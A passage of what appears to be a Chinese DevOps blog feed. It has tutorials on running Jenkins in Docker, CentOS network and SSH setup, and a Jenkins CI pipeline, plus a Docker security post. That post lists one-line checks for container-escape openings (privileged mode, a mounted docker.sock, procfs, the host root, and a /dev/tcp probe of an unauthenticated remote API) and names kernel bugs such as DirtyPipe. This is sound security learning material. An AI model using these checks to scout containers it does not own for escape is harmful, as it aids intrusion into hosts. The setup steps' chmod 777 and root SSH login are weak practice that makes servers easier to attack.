crpi-oep0r0ys6k2kecir.cn-guangzhou.personal.cr.aliyuncs.com/netimages/jenkins:2.492.1-lts</span><br></pre></td></tr></table></figure><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214185849367.png" alt="image-20250214185849367"></p><h3 id="修改名字"><a href="#修改名字" class="headerlink" title="修改名字"></a>修改名字</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker tag crpi-oep0r0ys6k2kecir.cn-guangzhou.personal.cr.aliyuncs.com/netimages/jenkins:2.492.1-lts jenkins:2.492.1-lts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker rmi crpi-oep0r0ys6k2kecir.cn-guangzhou.personal.cr.aliyuncs.com/netimages/jenkins:2.492.1-lts</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214190524723.png" alt="image-20250214190524723"></p><h3 id="创建docker-compose-yml"><a href="#创建docker-compose-yml" class="headerlink" title="创建docker-compose.yml"></a>创建docker-compose.yml</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir docker</span><br><span class="line">cd docker/</span><br><span class="line">mkdir docker-jenkins</span><br><span class="line">cd docker-jenkins/</span><br><span class="line"></span><br><span class="line">#/usr/local/docker/docker-jenkins</span><br><span class="line">vi docker-compose.yml</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214190750699.png" alt="image-20250214190750699"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">services:</span><br><span class="line">  jenkins:</span><br><span class="line">    image: &#x27;jenkins:2.492.1-lts&#x27;</span><br><span class="line">    container_name: jenkins</span><br><span class="line">    ports:</span><br><span class="line">      - &#x27;8080:8080&#x27;</span><br><span class="line">      - &#x27;50000:50000&#x27;</span><br><span class="line">    volumes:</span><br><span class="line">      - &#x27;./data:/var/jenkins_home/&#x27;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">或者换命令方式</span><br><span class="line">docker run -d \</span><br><span class="line">-p 8080:8080 -p 50000:50000\</span><br><span class="line">--name jenkins \</span><br><span class="line">-v /usr/local/docker/docker-jenkins/data:/var/jenkins_home/ \</span><br><span class="line">jenkins:2.492.1-lts</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214191414880.png" alt="image-20250214191414880"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 777 data</span><br><span class="line">docker-compose restart</span><br><span class="line">docker-compose logs -f</span><br></pre></td></tr></table></figure><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214191707037.png" alt="image-20250214191707037"></p><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214191739761.png" alt="image-20250214191739761"></p><h3 id="拷贝密码出来"><a href="#拷贝密码出来" class="headerlink" title="拷贝密码出来"></a>拷贝密码出来</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">34e9194af98d496aa2dbc45aa7ca0146</span><br></pre></td></tr></table></figure><h3 id="访问http-192-168-128-152-8080"><a href="#访问http-192-168-128-152-8080" class="headerlink" title="访问http://192.168.128.152:8080/"></a>访问<a href="http://192.168.128.152:8080/">http://192.168.128.152:8080/</a></h3><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214193319337.png" alt="image-20250214193319337"></p><h3 id="选择插件来安装"><a href="#选择插件来安装" class="headerlink" title="选择插件来安装"></a>选择插件来安装</h3><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214193636355.png" alt="image-20250214193636355"></p><h3 id="比较慢，换源"><a href="#比较慢，换源" class="headerlink" title="比较慢，换源"></a>比较慢，换源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vi hudson.model.UpdateCenter.xml</span><br><span class="line">换源</span><br><span class="line">http://mirror.esuni.jp/jenkins/updates/update-center.json</span><br><span class="line"></span><br><span class="line">重启</span><br><span class="line">docker-compose restart</span><br></pre></td></tr></table></figure><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214195245831.png" alt="image-20250214195614320"></p><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214195614320.png" alt="image-20250214195614320"></p><h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214201203772.png" alt="image-20250214201203772"></p><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214201229864.png" alt="image-20250214201229864"></p><h3 id="另外安装插件"><a href="#另外安装插件" class="headerlink" title="另外安装插件"></a>另外安装插件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Git Parameter</span><br><span class="line">publish over ssh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214201536979.png" alt="image-20250214201536979"></p><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214201737147.png" alt="image-20250214201737147"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="移动jdk-maven到-usr-local-docker-docker-jenkins-data"><a href="#移动jdk-maven到-usr-local-docker-docker-jenkins-data" class="headerlink" title="移动jdk&#x2F;maven到 &#x2F;usr&#x2F;local&#x2F;docker&#x2F;docker-jenkins&#x2F;data&#x2F;"></a>移动jdk&#x2F;maven到 &#x2F;usr&#x2F;local&#x2F;docker&#x2F;docker-jenkins&#x2F;data&#x2F;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/docker/docker-jenkins/data/</span><br><span class="line">mv /usr/local/jdk ./jdk</span><br><span class="line">mv /usr/local/maven ./maven</span><br></pre></td></tr></table></figure><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214202536808.png" alt="image-20250214202536808"></p><h3 id="确认docker已经映射到该目录"><a href="#确认docker已经映射到该目录" class="headerlink" title="确认docker已经映射到该目录"></a>确认docker已经映射到该目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost data]# docker exec -it jenkins bash</span><br><span class="line">jenkins@b835cb0c9a28:/$ pwd</span><br><span class="line">/</span><br><span class="line">jenkins@b835cb0c9a28:/$ cd ~</span><br><span class="line">jenkins@b835cb0c9a28:~$ pwd</span><br><span class="line">/var/jenkins_home</span><br></pre></td></tr></table></figure><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214202908030.png" alt="image-20250214202908030"></p><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214202732821.png" alt="image-20250214202732821"></p><h3 id="配置jenkins-TOOL"><a href="#配置jenkins-TOOL" class="headerlink" title="配置jenkins TOOL"></a>配置jenkins TOOL</h3><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214203104829.png" alt="image-20250214203104829"></p><h3 id="选择jdk和maven目录"><a href="#选择jdk和maven目录" class="headerlink" title="选择jdk和maven目录"></a>选择jdk和maven目录</h3><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214203301065.png" alt="image-20250214203301065"></p><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214203440752.png" alt="image-20250214203440752"></p><h2 id="实现推送"><a href="#实现推送" class="headerlink" title="实现推送"></a>实现推送</h2><h3 id="系统配置publish-over-ssh-测试"><a href="#系统配置publish-over-ssh-测试" class="headerlink" title="系统配置publish over ssh 测试"></a>系统配置publish over ssh 测试</h3><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214204352398.png" alt="image-20250214204352398"></p><h3 id="高级-输入密码"><a href="#高级-输入密码" class="headerlink" title="高级-输入密码"></a>高级-输入密码</h3><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214204035637.png" alt="image-20250214204035637"></p><h3 id="创建测试目录"><a href="#创建测试目录" class="headerlink" title="创建测试目录"></a>创建测试目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/local/test</span><br><span class="line">test cinfiguration 没有报错即可</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DevOps环境搭建 </category>
          
          <category> jenkins </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CI/CD </tag>
            
            <tag> docker </tag>
            
            <tag> jenkins </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker安全利用</title>
      <link href="/2025/03/09/docker%E5%AE%89%E5%85%A8/"/>
      <url>/2025/03/09/docker%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="docker安全"><a href="#docker安全" class="headerlink" title="docker安全"></a>docker安全</h1><h2 id="当前环境是不是容器环境"><a href="#当前环境是不是容器环境" class="headerlink" title="当前环境是不是容器环境"></a>当前环境是不是容器环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/cgroup | grep -qi docker &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Is Docker&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Not Docker&quot;</span></span><br></pre></td></tr></table></figure><h3 id="容器逃逸介绍"><a href="#容器逃逸介绍" class="headerlink" title="容器逃逸介绍"></a>容器逃逸介绍</h3><p>在开始之前对于容器逃逸主要有以下三种方法：</p><ol><li>不安全的配置</li><li>相关程序漏洞</li><li>内核漏洞</li></ol><h2 id="0x01-不安全的配置"><a href="#0x01-不安全的配置" class="headerlink" title="0x01 不安全的配置"></a>0x01 不安全的配置</h2><h3 id="1、特权模式"><a href="#1、特权模式" class="headerlink" title="#1、特权模式"></a><a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html#_1%E3%80%81%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F">#</a>1、特权模式</h3><p>执行以下命令，如果返回 Is privileged mode 则说明当前是特权模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/status | grep -qi <span class="string">&quot;0000003fffffffff&quot;</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Is privileged mode&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Not privileged mode&quot;</span></span><br></pre></td></tr></table></figure><p>1</p><p>如果返回 Not privileged mode 则说明当前不是特权模式</p><h3 id="2、挂载-Docker-Socket"><a href="#2、挂载-Docker-Socket" class="headerlink" title="#2、挂载 Docker Socket"></a><a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html#_2%E3%80%81%E6%8C%82%E8%BD%BD-docker-socket">#</a>2、挂载 Docker Socket</h3><p>执行以下命令，如果返回 Docker Socket is mounted. 说明当前挂载了 Docker Socket</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /var/run/ | grep -qi docker.sock &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Docker Socket is mounted.&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Docker Socket is not mounted.&quot;</span></span><br></pre></td></tr></table></figure><p>1</p><p>如果返回 Docker Socket is not mounted. 则说明没有挂载</p><h3 id="3、挂载-procfs"><a href="#3、挂载-procfs" class="headerlink" title="#3、挂载 procfs"></a><a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html#_3%E3%80%81%E6%8C%82%E8%BD%BD-procfs">#</a>3、挂载 procfs</h3><p>执行以下命令，如果返回 Procfs is mounted. 说明当前挂载了 procfs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name core_pattern 2&gt;/dev/null | <span class="built_in">wc</span> -l | grep -q 2 &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Procfs is mounted.&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Procfs is not mounted.&quot;</span></span><br></pre></td></tr></table></figure><p>1</p><p>如果返回 Procfs is not mounted. 则说明没有挂载</p><h3 id="4、挂载宿主机根目录"><a href="#4、挂载宿主机根目录" class="headerlink" title="#4、挂载宿主机根目录"></a><a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html#_4%E3%80%81%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%A0%B9%E7%9B%AE%E5%BD%95">#</a>4、挂载宿主机根目录</h3><p>执行以下命令，如果返回 Root directory is mounted. 则说明宿主机目录被挂载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name passwd 2&gt;/dev/null | grep /etc/passwd | <span class="built_in">wc</span> -l | grep -q 7 &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Root directory is mounted.&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Root directory is not mounted.&quot;</span></span><br></pre></td></tr></table></figure><p>1</p><p>如果返回 Root directory is not mounted. 则说明没有挂载</p><h3 id="5、Docker-remote-api-未授权访问"><a href="#5、Docker-remote-api-未授权访问" class="headerlink" title="#5、Docker remote api 未授权访问"></a><a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html#_5%E3%80%81docker-remote-api-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">#</a>5、Docker remote api 未授权访问</h3><p>执行以下命令，如果返回 Docker Remote API Is Enabled. 说明目标存在 Docker remote api 未授权访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP=`hostname -i | awk -F. <span class="string">&#x27;&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;&#x27;</span> ` &amp;&amp; <span class="built_in">timeout</span> 3 bash -c <span class="string">&quot;echo &gt;/dev/tcp/<span class="variable">$IP</span>/2375&quot;</span> &gt; /dev/null 2&gt;&amp;1 &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Docker Remote API Is Enabled.&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Docker Remote API is Closed.&quot;</span></span><br></pre></td></tr></table></figure><p>1</p><p>如果返回 Docker Remote API is Closed. 则表示目标不存在 Docker remote api 未授权访问</p><h2 id="0x02-内核漏洞"><a href="#0x02-内核漏洞" class="headerlink" title="#0x02 内核漏洞"></a><a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html#_0x02-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E">#</a>0x02 内核漏洞</h2><h3 id="1、CVE-2016-5195-DirtyCow-逃逸"><a href="#1、CVE-2016-5195-DirtyCow-逃逸" class="headerlink" title="#1、CVE-2016-5195 DirtyCow 逃逸"></a><a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html#_1%E3%80%81cve-2016-5195-dirtycow-%E9%80%83%E9%80%B8">#</a>1、CVE-2016-5195 DirtyCow 逃逸</h3><p>执行 uname -r 命令，如果在 2.6.22 &lt;&#x3D; 版本 &lt;&#x3D; 4.8.3 之间说明可能存在 CVE-2016-5195 DirtyCow 漏洞。</p><h3 id="2、CVE-2020-14386"><a href="#2、CVE-2020-14386" class="headerlink" title="#2、CVE-2020-14386"></a><a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html#_2%E3%80%81cve-2020-14386">#</a>2、CVE-2020-14386</h3><p>执行 uname -r 命令，如果在 4.6 &lt;&#x3D; 版本 &lt; 5.9 之间说明可能存在 CVE-2020-14386 漏洞。</p><h3 id="3、CVE-2022-0847-DirtyPipe-逃逸"><a href="#3、CVE-2022-0847-DirtyPipe-逃逸" class="headerlink" title="#3、CVE-2022-0847 DirtyPipe 逃逸"></a><a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html#_3%E3%80%81cve-2022-0847-dirtypipe-%E9%80%83%E9%80%B8">#</a>3、CVE-2022-0847 DirtyPipe 逃逸</h3><p>执行 uname -r 命令，如果在 5.8 &lt;&#x3D; 版本 &lt; 5.10.102 &lt; 版本 &lt; 5.15.25 &lt; 版本 &lt; 5.16.11 之间说明可能存在 CVE-2022-0847 DirtyPipe 漏洞</p><h2 id="容器逃逸检测脚本"><a href="#容器逃逸检测脚本" class="headerlink" title="容器逃逸检测脚本"></a>容器逃逸检测脚本</h2><p>项目地址：<a href="https://github.com/teamssix/container-escape-check">https://github.com/teamssix/container-escape-check</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/teamssix/container-escape-check.git</span><br><span class="line"><span class="built_in">cd</span> container-escape-check</span><br><span class="line"><span class="built_in">chmod</span> +x container-escape-check.sh</span><br><span class="line">./container-escape-check.sh</span><br></pre></td></tr></table></figure><p><img src="/images/docker%E5%AE%89%E5%85%A8.assets/image-20250109225203957.png" alt="image-20250109225203957"></p><p><img src="/images/docker%E5%AE%89%E5%85%A8.assets/image-20250109225232265.png" alt="image-20250109225232265"></p>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> sh </tag>
            
            <tag> 漏洞检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos配置</title>
      <link href="/2025/03/09/centos%E5%AE%89%E8%A3%85/"/>
      <url>/2025/03/09/centos%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="centos安装"><a href="#centos安装" class="headerlink" title="centos安装"></a>centos安装</h1><h2 id="ip-addr-没有IP"><a href="#ip-addr-没有IP" class="headerlink" title="ip addr 没有IP"></a>ip addr 没有IP</h2><p>修改</p><p>#vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33</p><p><strong>bootproto&#x3D;dhcp</strong></p><p><strong>onboot&#x3D;yes</strong></p><p>#systemctl restart network</p><p><img src="/images/centos%E5%AE%89%E8%A3%85.assets/image-20250212154947256.png" alt="image-20250212154947256"></p><p>固定IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOTPROTO=none</span><br><span class="line">IPADDR=192.168.128.152 </span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line"></span><br><span class="line">systemctl restart network  </span><br></pre></td></tr></table></figure><h2 id="Linux系统yum安装报错Cannot-find-a-valid-baseurl-for-repo"><a href="#Linux系统yum安装报错Cannot-find-a-valid-baseurl-for-repo" class="headerlink" title="Linux系统yum安装报错Cannot find a valid baseurl for repo"></a>Linux系统yum安装报错Cannot find a valid baseurl for repo</h2><p><img src="/images/centos%E5%AE%89%E8%A3%85.assets/image-20250212155250650.png" alt="image-20250212155250650"></p><h4 id="更换阿里云源ok"><a href="#更换阿里云源ok" class="headerlink" title="更换阿里云源ok"></a>更换阿里云源ok</h4><p>vi &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo</p><p>baseurl&#x3D;<a href="http://mirrors.aliyun.com/centos/">http://mirrors.aliyun.com/centos/</a></p><p><img src="/images/centos%E5%AE%89%E8%A3%85.assets/image-20250212160207098.png" alt="image-20250212160207098"></p><p>yum install vim</p><p><img src="/images/centos%E5%AE%89%E8%A3%85.assets/image-20250212160327213.png" alt="image-20250212160327213"></p><p>yum install net-tools</p><h2 id="ssh开启"><a href="#ssh开启" class="headerlink" title="ssh开启"></a>ssh开启</h2><h3 id="1-安装OpenSSH服务器"><a href="#1-安装OpenSSH服务器" class="headerlink" title="1. 安装OpenSSH服务器"></a>1. 安装OpenSSH服务器</h3><p>首先，确保你的CentOS系统上已经安装了OpenSSH服务器。可以通过以下命令来安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install openssh-server -y</span><br></pre></td></tr></table></figure><h3 id="2-设置端口和允许root登录"><a href="#2-设置端口和允许root登录" class="headerlink" title="2.设置端口和允许root登录"></a>2.设置端口和允许root登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure><h3 id="3-启动SSH服务"><a href="#3-启动SSH服务" class="headerlink" title="3. 启动SSH服务"></a>3. 启动SSH服务</h3><p>安装完成后，你可以使用以下命令来启动SSH服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start sshd </span><br></pre></td></tr></table></figure><h3 id="4-设置SSH服务开机自启"><a href="#4-设置SSH服务开机自启" class="headerlink" title="4. 设置SSH服务开机自启"></a>4. 设置SSH服务开机自启</h3><p>为了确保每次系统启动时SSH服务都能自动启动，你需要设置它为开机自启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable sshd</span><br></pre></td></tr></table></figure><p><img src="/images/centos%E5%AE%89%E8%A3%85.assets/image-20250212161906652.png" alt="image-20250212161906652"></p>]]></content>
      
      
      <categories>
          
          <category> DevOps环境搭建 </category>
          
          <category> centos </category>
          
      </categories>
      
      
        <tags>
            
            <tag> centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jenkins-CI</title>
      <link href="/2025/03/09/jenkins-CI/"/>
      <url>/2025/03/09/jenkins-CI/</url>
      
        <content type="html"><![CDATA[<h1 id="CI-CD（3）"><a href="#CI-CD（3）" class="headerlink" title="CI&#x2F;CD（3）"></a>CI&#x2F;CD（3）</h1><h1 id="IDEA创建一个spring-boot测试项目"><a href="#IDEA创建一个spring-boot测试项目" class="headerlink" title="IDEA创建一个spring boot测试项目"></a>IDEA创建一个spring boot测试项目</h1><p><img src="/images/jenkins-CI.assets/image-20250214231807453.png" alt="image-20250214231807453"></p><p><img src="/images/jenkins-CI.assets/image-20250214215901428.png" alt="image-20250214215901428"></p><h2 id="设置maven"><a href="#设置maven" class="headerlink" title="设置maven"></a>设置maven</h2><p><img src="/images/jenkins-CI.assets/image-20250214220807952.png" alt="image-20250214220807952"></p><h2 id="创建类"><a href="#创建类" class="headerlink" title="创建类"></a>创建类</h2><p>controller.TestController</p><p><img src="/images/jenkins-CI.assets/image-20250214220738970.png" alt="image-20250214220738970"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package com.example.mytest.controller;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line"></span><br><span class="line">public class TestController &#123;</span><br><span class="line">    </span><br><span class="line">    @GetMapping(&quot;/test&quot;)</span><br><span class="line">    public String test() &#123;</span><br><span class="line">        return &quot;Hello Jenkins!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>报错 java: 程序包org.springframework.boot.test.context不存在，文件-设置</p><p><img src="/images/jenkins-CI.assets/image-20250214230446927.png" alt="image-20250214230446927"></p><h2 id="成功访问"><a href="#成功访问" class="headerlink" title="成功访问"></a>成功访问</h2><p><img src="/images/jenkins-CI.assets/image-20250214232204042.png" alt="image-20250214232204042"></p><h1 id="gitlab创建项目"><a href="#gitlab创建项目" class="headerlink" title="gitlab创建项目"></a>gitlab创建项目</h1><p><img src="/images/jenkins-CI.assets/image-20250214232358039.png" alt="image-20250214232358039"></p><p><img src="/images/jenkins-CI.assets/image-20250214232453506.png" alt="image-20250214232453506"></p><p><img src="/images/jenkins-CI.assets/image-20250214232700278.png" alt="image-20250214232700278"></p><h2 id="设置git"><a href="#设置git" class="headerlink" title="设置git"></a>设置git</h2><p><img src="/images/jenkins-CI.assets/image-20250214232758856.png" alt="image-20250214232758856"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --local user.name &quot;Administrator&quot;</span><br><span class="line">git config --local user.email &quot;gitlab_admin_a67709@example.com&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/jenkins-CI.assets/image-20250214232848060.png" alt="image-20250214232848060"></p><h3 id="commit"><a href="#commit" class="headerlink" title="commit!"></a>commit!</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">first commit!</span><br></pre></td></tr></table></figure><p><img src="/images/jenkins-CI.assets/image-20250214233510098.png" alt="image-20250214233510098"></p><h3 id="git-clone"><a href="#git-clone" class="headerlink" title="git  clone"></a>git  clone</h3><p><img src="/images/jenkins-CI.assets/image-20250214233638777.png" alt="image-20250214233638777"></p><p><img src="/images/jenkins-CI.assets/image-20250214233806990.png" alt="image-20250214233806990"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.128.151:8089/root/mytest.git</span><br></pre></td></tr></table></figure><p><img src="/images/jenkins-CI.assets/image-20250214233903631.png" alt="image-20250214233903631"></p><h3 id="先登录"><a href="#先登录" class="headerlink" title="先登录"></a>先登录</h3><p><img src="/images/jenkins-CI.assets/image-20250214234028822.png" alt="image-20250214234028822"></p><p>generrate 跳转创建即可</p><h3 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h3><p><img src="/images/jenkins-CI.assets/image-20250214234208074.png" alt="image-20250214234208074"></p><h2 id="jenkins创建任务"><a href="#jenkins创建任务" class="headerlink" title="jenkins创建任务"></a>jenkins创建任务</h2><p><img src="/images/jenkins-CI.assets/image-20250214234327992.png" alt="image-20250214234327992"></p><p><img src="/images/jenkins-CI.assets/image-20250214234404578.png" alt="image-20250214234404578"></p><p><img src="/images/jenkins-CI.assets/image-20250214234628546.png" alt="image-20250214234628546"></p><h3 id="jenkins构建就会拉取代码到docker"><a href="#jenkins构建就会拉取代码到docker" class="headerlink" title="jenkins构建就会拉取代码到docker"></a>jenkins构建就会拉取代码到docker</h3><p><img src="/images/jenkins-CI.assets/image-20250214235138666.png" alt="image-20250214235138666"></p><p><img src="/images/jenkins-CI.assets/image-20250214235041915.png" alt="image-20250214235041915"></p><h2 id="配置maven构建"><a href="#配置maven构建" class="headerlink" title="配置maven构建"></a>配置maven构建</h2><h3 id="安装这个Maven-Integration"><a href="#安装这个Maven-Integration" class="headerlink" title="安装这个Maven Integration"></a>安装这个Maven Integration</h3><p><img src="/images/jenkins-CI.assets/image-20250215000037946.png" alt="image-20250215000037946"></p><h3 id="增加构建步骤"><a href="#增加构建步骤" class="headerlink" title="增加构建步骤"></a>增加构建步骤</h3><p>找到lnvoke top-level maven 